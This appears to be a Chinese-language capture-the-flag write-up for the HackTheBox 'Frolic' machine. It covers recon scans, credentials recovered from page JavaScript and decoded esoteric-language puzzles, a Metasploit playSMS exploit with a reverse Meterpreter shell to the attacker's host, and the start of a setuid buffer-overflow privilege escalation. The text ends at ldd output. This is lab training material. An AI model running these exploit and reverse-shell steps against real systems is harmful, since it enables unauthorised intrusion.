OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W2= OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s |_nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2022-04-26T06:53:50+05:30 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2022-04-26T01:23:52 |_ start_date: N/A TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 323.74 ms 10.10.14.1 2 318.95 ms 10.10.10.111 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.58 seconds Http1880 尝试了一下，admin&#x2F;admin 会登录失败，但 admin&#x2F;password 会提示超时，有点奇怪，fuzz 了一下没什么东西，先放着 9999 Smb┌──(root💀kali)-[~/Desktop] └─# smbmap -H 10.10.10.111 [+] Guest session IP: 10.10.10.111:445 Name: 10.10.10.111 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (frolic server (Samba, Ubuntu)) smb 扫了一下，也没什么东西 Fuzz1880┌──(root💀kali)-[~/Desktop] └─# gobuster dir -u http://10.10.10.111:1880/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:1880/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/25 21:56:22 Starting gobuster in directory enumeration mode =============================================================== /icons (Status: 401) [Size: 12] /red (Status: 301) [Size: 173] [--&gt; /red/] /vendor (Status: 301) [Size: 179] [--&gt; /vendor/] /settings (Status: 401) [Size: 12] /Icons (Status: 401) [Size: 12] /nodes (Status: 401) [Size: 12] /SETTINGS (Status: 401) [Size: 12] /flows (Status: 401) [Size: 12] /ICONS (Status: 401) [Size: 12] =============================================================== 2022/04/25 22:03:47 Finished =============================================================== fuzz 了一下，没东西，继续放着吧 9999┌──(root💀kali)-[~/Desktop] └─# gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/25 21:52:59 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/admin/] /test (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/test/] /dev (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/dev/] /backup (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/backup/] /loop (Status: 301) [Size: 194] [--&gt; http://10.10.10.111:9999/loop/] =============================================================== 2022/04/25 22:00:19 Finished =============================================================== 我感觉突破口就在这边了 admin 目录是一个登录页面，先看看其他的 test 目录是一个 phpinfo 有点意思 backup 里有两个文件一个目录，看着像是账号密码 username = admin password = imnothuman 得到了一个账号密码，那个目录 403 进不去 咱们去登录一下看看 这边提示登录失败，那会不会是在 1880 登录呢？ 也登录失败，有点奇怪 http://10.10.10.111:9999/admin/js/login.js var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;&amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } 查看源代码的时候找到了一个密码，啊这？ username = admin password = superduperlooperpassword_lol 漏洞利用 http://10.10.10.111:9999/admin/success.html登录后进入了这个页面，拿到了一堆奇奇怪怪的字符，像是某种加密，尝试解密一下看看 我搜了一下资料，这个编程语言叫做 Okk，我找到了一个这种语言的解密网站 https://esolangs.org/wiki/ook! https://www.dcode.fr/ook-language Nothing here check /asdiSIAJJ0QWE9JAS 继续去访问一下 http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 似乎拿到了一段 BASE64 编码 ┌──(root💀kali)-[~/Desktop] └─# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 487 0 487 0 0 749 0 --:--:-- --:--:-- --:--:-- 749 PK É7M#�[�i index.phpUT �|�[�|�[ux ^D�J�s�h�)�P�n ��Ss�Jw▒܎��4��k�z��UȖ�+X��P��ᶇ��л�x_�N�[���S��8�����J2S�*�DЍ}�8dTQk������j_���▒���&#39;xc��ݏt��75Q� ���k,4��b)�4F�� ���������&amp;q2o�WԜ�9P#�[�iPK É7M#�[�i ▒��index.phpUT�|�[ux PKO 解密后得到了一些乱码输出，有点奇怪，尝试给他写出到文件，然后查看下类型呢 ┌──(root💀kali)-[~/Desktop] └─# curl http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/|base64 -d &gt; file % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 487 0 487 0 0 748 0 --:--:-- --:--:-- --:--:-- 749 ┌──(root💀kali)-[~/Desktop] └─# file file file: Zip archive data, at least v2.0 to extract 这是一个 zip 的压缩文件，去更改下后缀然后尝试解压 ┌──(root💀kali)-[~/Desktop] └─# mv file file.zip ┌──(root💀kali)-[~/Desktop] └─# unzip file.zip Archive: file.zip [file.zip] index.php password: skipping: index.php incorrect password 有解压密码，随手尝试几个弱口令试试 ┌──(root💀kali)-[~/Desktop] └─# unzip file.zip Archive: file.zip [file.zip] index.php password: inflating: index.php 解压密码是 password，成功解压出来一个 index.php 文件 ┌──(root💀kali)-[~/Desktop] └─# cat index.php 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a 这又是编码。。。 这应该是十六进制编码，我们去解密一下 https://gchq.github.io/CyberChef/ 出来后是 base64 编码，咱们再解密一重 +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;--- &lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; ++..&lt; 这是次 brainfuck，咱们去解密一下 https://sange.fi/esoteric/brainfuck/impl/interp/i.html username = admin password = idkwhatispass 在 &#x2F;dev&#x2F;backup 中提示有一个 &#x2F;playsms 目录 咱们在这里登录 登录成功，到处找找看 Google 了一下，playSMS 的漏洞挺多的，解密累了，懒得找了，直接 msf 打试试吧 use multi/http/playsms_uploadcsv_exec msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; show options Module options (exploit/multi/http/playsms_uploadcsv_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD idkwhatispass yes Password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.111 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 9999 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI /playsms yes Base playsms directory path USERNAME admin yes Username to authenticate with VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.10 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PlaySMS 1.4 按照这样设置好，然后 exploit 执行即可 msf6 exploit(multi/http/playsms_uploadcsv_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.14.10:4444 [+] Authentication successful: admin:idkwhatispass [*] Sending stage (39282 bytes) to 10.10.10.111 [*] Meterpreter session 2 opened (10.10.14.10:4444 -&gt; 10.10.10.111:52368) at 2022-04-25 23:13:40 -0400 meterpreter &gt; getuid Server username: www-data (33) 成功拿到一个 user 权限 www-data@frolic:/home/ayush$ cat user.txt cat user.txt 2ab95909cf509f85a6f476b59a0c2fe0 成功拿到一个 user 权限的 flag 文件 权限提升www-data@frolic:/home/ayush/.binary$ ls -la ls -la total 16 drwxrwxr-x 2 ayush ayush 4096 Sep 25 2018 . drwxr-xr-x 3 ayush ayush 4096 Sep 25 2018 .. -rwsr-xr-x 1 root root 7480 Sep 25 2018 rop www-data@frolic:/home/ayush/.binary$ pwd pwd /home/ayush/.binary 在 &#x2F;home&#x2F;ayush&#x2F;.binary 下发现了一个 rop 文件，并且我们拥有可执行权限 www-data@frolic:/home/ayush/.binary$ ./rop ./rop [*] Usage: program &lt;message&gt; 会获取我们的输入内容，然后输出 www-data@frolic:/home/ayush/.binary$ base64 rop base64 rop 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 AAAAAAAAAAAEAPH/AQAAAAAAAAAAAAAABADx/6sAAAAUhwQIAAAAAAEAEgC5AAAAEJ8ECAAAAAAB ABUAAAAAAAAAAAAAAAAABADx/8UAAAAMnwQIAAAAAAAAEwDWAAAAFJ8ECAAAAAABABYA3wAAAAif BAgAAAAAAAATAPIAAADwhQQIAAAAAAAAEQAFAQAAAKAECAAAAAABABgAGwEAAKCFBAgCAAAAEgAO ACsBAAAAAAAAAAAAACAAAABHAQAA0IMECAQAAAASAg4AjwEAACCgBAgAAAAAIAAZAF0BAAAAAAAA AAAAABIAAABvAQAA+IQECDoAAAASAA4AdAEAACigBAgAAAAAEAAZACUBAACkhQQIAAAAABIADwB7 AQAAAAAAAAAAAAASAAAAjQEAACCgBAgAAAAAEAAZAJoBAAAAAAAAAAAAABIAAACqAQAAAAAAAAAA AAAgAAAAuQEAACSgBAgAAAAAEQIZAMYBAAC8hQQIBAAAABEAEADVAQAAAAAAAAAAAAASAAAA8gEA AECFBAhdAAAAEgAOANEAAAAsoAQIAAAAABAAGgCTAQAAoIMECAAAAAASAA4AAgIAALiFBAgEAAAA EQAQAAkCAAAooAQIAAAAABAAGgAVAgAAm4QECF0AAAASAA4AGgIAAAAAAAAAAAAAEgAAACwCAAAA AAAAAAAAACAAAABAAgAAKKAECAAAAAARAhkATAIAAAAAAAAAAAAAIAAAAPwBAAAMgwQIAAAAABIA CwAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9i YWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43MjA5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2Fy cmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQByb3Au YwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19p bml0X2FycmF5X3N0YXJ0AF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8A X19saWJjX2NzdV9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX3g4Ni5nZXRfcGNf dGh1bmsuYngAcHJpbnRmQEBHTElCQ18yLjAAdnVsbgBfZWRhdGEAc3RyY3B5QEBHTElCQ18yLjAA X19kYXRhX3N0YXJ0AHB1dHNAQEdMSUJDXzIuMABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA X0lPX3N0ZGluX3VzZWQAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2xpYmNfY3N1X2lu aXQAX2ZwX2h3AF9fYnNzX3N0YXJ0AG1haW4Ac2V0dWlkQEBHTElCQ18yLjAAX0p2X1JlZ2lzdGVy Q2xhc3NlcwBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAAAuc3ltdGFiAC5z dHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQA LmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJl bC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh bWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5n b3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAABsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAA AAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAAcAAAACAAAAiIEECIgBAAAkAAAA AAAAAAAAAAAEAAAAAAAAAEQAAAD2//9vAgAAAKyBBAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAABO AAAACwAAAAIAAADMgQQIzAEAAIAAAAAGAAAAAQAAAAQAAAAQAAAAVgAAAAMAAAACAAAATIIECEwC AABfAAAAAAAAAAAAAAABAAAAAAAAAF4AAAD///9vAgAAAKyCBAisAgAAEAAAAAUAAAAAAAAAAgAA AAIAAABrAAAA/v//bwIAAAC8ggQIvAIAACAAAAAGAAAAAQAAAAQAAAAAAAAAegAAAAkAAAACAAAA 3IIECNwCAAAIAAAABQAAAAAAAAAEAAAACAAAAIMAAAAJAAAAQgAAAOSCBAjkAgAAKAAAAAUAAAAY AAAABAAAAAgAAACMAAAAAQAAAAYAAAAMgwQIDAMAACMAAAAAAAAAAAAAAAQAAAAAAAAAhwAAAAEA AAAGAAAAMIMECDADAABgAAAAAAAAAAAAAAAQAAAABAAAAJIAAAABAAAABgAAAJCDBAiQAwAACAAA AAAAAAAAAAAACAAAAAAAAACbAAAAAQAAAAYAAACggwQIoAMAAAICAAAAAAAAAAAAABAAAAAAAAAA oQAAAAEAAAAGAAAApIUECKQFAAAUAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAABAAAAAgAAALiFBAi4 BQAAOAAAAAAAAAAAAAAABAAAAAAAAACvAAAAAQAAAAIAAADwhQQI8AUAADQAAAAAAAAAAAAAAAQA AAAAAAAAvQAAAAEAAAACAAAAJIYECCQGAAD0AAAAAAAAAAAAAAAEAAAAAAAAAMcAAAAOAAAAAwAA AAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADTAAAADwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAA AAAAAAQAAAAAAAAA3wAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAOQAAAAG AAAAAwAAABSfBAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACWAAAAAQAAAAMAAAD8nwQI/A8AAAQA AAAAAAAAAAAAAAQAAAAEAAAA7QAAAAEAAAADAAAAAKAECAAQAAAgAAAAAAAAAAAAAAAEAAAABAAA APYAAAABAAAAAwAAACCgBAggEAAACAAAAAAAAAAAAAAABAAAAAAAAAD8AAAACAAAAAMAAAAooAQI KBAAAAQAAAAAAAAAAAAAAAEAAAAAAAAAAQEAAAEAAAAwAAAAAAAAACgQAAA1AAAAAAAAAAAAAAAB AAAAAQAAABEAAAADAAAAAAAAAAAAAABWFwAACgEAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAA AAAAAAAAYBAAAJAEAAAeAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPAUAABmAgAAAAAA AAAAAAABAAAAAAAAAA== 编码这个文件，然后带我们自己的机器上解码查看调试 ┌──(root💀kali)-[~/Desktop] └─# cat rop.base64|base64 -d &gt; rop ┌──(root💀kali)-[~/Desktop] └─# chmod +x rop ┌──(root💀kali)-[~/Desktop] └─# ./rop hello [+] Message sent: hello ┌──(root💀kali)-[~/Desktop] └─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 使用 metasploit 的 pattern 生成一个 100 字符的不重复字段 gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Starting program: /root/Desktop/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x64 (&#39;d&#39;) EBX: 0xffffd0f0 --&gt; 0x2 ECX: 0xf7fa7000 --&gt; 0x1ead6c EDX: 0x0 ESI: 0x2 EDI: 0x80483a0 (&lt;_start&gt;: xor ebp,ebp) EBP: 0x41366241 (&#39;Ab6A&#39;) ESP: 0xffffd0c0 (&quot;8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) EIP: 0x62413762 (&#39;b7Ab&#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x62413762 [------------------------------------stack-------------------------------------] 0000| 0xffffd0c0 (&quot;8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0004| 0xffffd0c4 (&quot;Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0008| 0xffffd0c8 (&quot;c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0012| 0xffffd0cc (&quot;2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0016| 0xffffd0d0 (&quot;Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0020| 0xffffd0d4 (&quot;c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0024| 0xffffd0d8 (&quot;6Ac7Ac8Ac9Ad0Ad1Ad2A&quot;) 0028| 0xffffd0dc (&quot;Ac8Ac9Ad0Ad1Ad2A&quot;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x62413762 in ?? () 确实是有缓冲区溢出 ┌──(root💀kali)-[~/Desktop] └─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762 [*] Exact match at offset 52 在第 52 个字符溢出了 ┌──(root💀kali)-[~/Desktop] └─# python -c &#39;print &quot;A&quot;*52&#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 使用 python 输出 52 个A，然后在后面再加上我们的 POC 现在我们需要知道 &#x2F;bin&#x2F;sh 的地址 www-data@frolic:/home/ayush/.binary$ ldd rop ldd rop linux-gate.so.1 =&gt; (0xb7fda000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) 